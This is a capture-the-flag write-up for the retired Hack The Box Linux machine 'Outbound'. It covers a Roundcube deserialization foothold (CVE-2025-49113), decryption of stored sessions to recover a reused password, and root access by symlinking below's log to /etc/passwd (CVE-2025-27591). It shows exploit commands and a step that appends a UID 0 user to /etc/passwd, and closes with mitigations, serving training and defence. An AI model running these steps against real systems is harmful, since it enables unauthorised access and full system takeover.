---
machine: Outbound
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, roundcube, cve, privesc]
---

# Outbound — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Roundcube 1.6.10 is vulnerable to CVE-2025-49113: a serialized PHP object in the avatar upload `_from` parameter runs code and yields a shell in the container. From there, decrypt Roundcube sessions and recover `jacob`'s password, reused over SSH. `below` 0.8.0 is vulnerable to CVE-2025-27591: a symlink under `/var/log/below` writes `/etc/passwd` as root.

## Recon

```bash
nmap -Pn -sCV -p22,25,80,443 <IP>
```

- `22` SSH, `25` SMTP, `80/443` nginx with Roundcube.
- The page redirects to `mail.outbound.htb`.
- The webmail reports version 1.6.10.

## Enumeration

- Roundcube allows account registration and avatar uploads.
- Version 1.6.10 predates the CVE-2025-49113 fix.
- The webmail container holds the Roundcube database and sessions in `/var/www/html/roundcube/temp/`.

## Foothold

Build a PHP object with a Roundcube gadget and send it base64-encoded in `_from` during avatar upload. `unserialize` runs the command and returns a reverse shell as `www-data`.

```bash
python3 cve-2025-49113.py --url https://mail.outbound.htb --user <USER> --pass <PASSWORD> --cmd 'id'
```

## Lateral movement

With container access, read the Roundcube sessions. The session key is in the configuration; decrypting them reveals `jacob`'s credentials. That password also works over SSH.

```bash
grep -r des_key /var/www/html/roundcube/config/
php decrypt_session.php <SESSION_FILE>
ssh jacob@<IP>
```

## Privilege escalation

`jacob` can run `below` as root. Version 0.8.0 creates `/var/log/below` writable and follows symlinks when rotating logs. Link `error_root.log` to `/etc/passwd` and add a UID 0 user with a known password.

```bash
ln -sf /etc/passwd /var/log/below/error_root.log
below record
printf '<USER>:<HASH>:0:0:root:/root:/bin/bash\n' >> /etc/passwd
su <USER>
```

## Evidence

- Version 1.6.10 and avatar upload with serialized `_from`.
- Reverse shell in the Roundcube container.
- Decrypted sessions and SSH as `jacob`.
- `below` symlink and UID 0 user in `/etc/passwd`.

## Lessons learned

- An exposed webmail accumulates sensitive versions and configuration.
- Encrypted sessions are recoverable when the key lives on the same host.
- A privileged log service following symlinks writes critical files.

## Mitigation and detection

- Update Roundcube and validate upload parameters.
- Rotate the `des_key` and do not reuse application passwords over SSH.
- Update `below` and avoid following links in log directories.

## References

- [0xdf — Outbound](https://0xdf.gitlab.io/2025/11/15/htb-outbound.html)
- [IppSec — Outbound](https://www.youtube.com/watch?v=bDql3eTHgZ8)
- [Hack The Box — Outbound](https://app.hackthebox.com/machines/outbound)
